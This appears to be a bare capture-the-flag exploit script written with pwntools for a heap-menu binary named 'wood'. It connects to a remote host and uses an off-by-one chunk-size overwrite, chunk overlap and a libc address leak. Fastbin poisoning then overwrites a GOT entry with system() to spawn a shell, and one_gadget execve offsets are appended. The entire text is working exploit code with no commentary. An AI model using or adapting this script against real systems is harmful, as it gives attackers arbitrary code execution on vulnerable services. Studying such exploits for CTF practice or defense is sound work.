from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./wood")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("172.1.14.10","8888")
    libc=ELF("./libc.so.6")
def debug():
    gdb.attach(a,'''
    b *0x000000000400A73
    b *0x000000000400D21
    b *0x000000000400B5B
    ''')
#malloc ,free
elf=ELF("./wood")
def menu(index):
    a.recvuntil("Your choice :")
    a.sendline(str(index))
def add(size,content):
    menu(1)
    a.recvuntil("how big is the nest ?")
    a.send(str(size))
    a.recvuntil("nest?")
    a.send(content)
def edit(index,content):
    menu(2)
    a.recvuntil(":")
    a.send(str(index))
    a.recvuntil("t?")
    a.send(content)
def show(index):
    menu(3)
    a.recvuntil(":")
    a.send(str(index))
def delete(index):
    menu(4)
    a.recvuntil(":")
    a.send(str(index))
#0x20
add(0x48,'A')#0
add(0x48,'A')#1,0x20,0x50
add(0x80,'A'*0x58+p64(0x21)+'A'*0x18+p64(0x21))#2,0x20,0x90
add(0x10,'A')#3
edit(0,'A'*0x48+'\xf1') # chunk 1 size ==> 0xf0
delete(1)#
add(0xd0-8,'A'*8)#1
show(1)
a.recvuntil("A"*8)
libc_base=u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)
fake_chunk=0x602002-8
success("fake_chunk = 0x%x"%fake_chunk)
system_addr=libc.symbols["system"]+libc_base
success("system_addr => 0x%x"%system_addr)
one_gadget=libc_base+0x45216
payload='A'*0x40
payload+=p64(0)+p64(0x61)
edit(1,payload)
edit(2,p64(0x21)*0x10)
delete(2)
payload='A'*0x40
payload+=p64(0)+p64(0x61)
payload+=p64(fake_chunk)
edit(1,payload)
add(0x58,'/bin/sh\x00')#2
add(0x58,'A'*14+p64(system_addr))#4,get fakechunk
delete(2)
a.interactive()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''